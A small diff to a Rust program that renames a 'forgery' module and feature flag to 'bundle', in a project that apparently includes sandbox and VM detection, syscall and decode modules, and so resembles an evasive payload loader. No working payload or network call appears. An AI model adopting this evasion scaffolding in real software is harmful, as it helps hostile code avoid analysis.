@@ -7,8 +7,8 @@ mod alloc_mem;
 mod decode;
 mod syscall;
 mod api;
-#[cfg(feature = "with_forgery")]
-mod forgery;
+#[cfg(feature = "with_bundling")]
+mod bundle;
 #[cfg(feature = "sandbox")]
 mod guard;
 
@@ -52,8 +52,8 @@ fn main() {
         print_message("Pass Sandbox/VM detection.");
     }
 
-    #[cfg(feature = "with_forgery")]
-    if let Err(_e) = forgery::bundle::bundlefile() {        
+    #[cfg(feature = "with_bundling")]
+    if let Err(_e) = bundle::bundlefile() {        
         #[cfg(feature = "debug")]        
         print_error("Failed to bundle:", &_e);
         exit_program();
@@ -124,7 +124,7 @@ fn main() {
                 exit_program();
             }
         }
-        
     }
+    
     exit_program();
 }
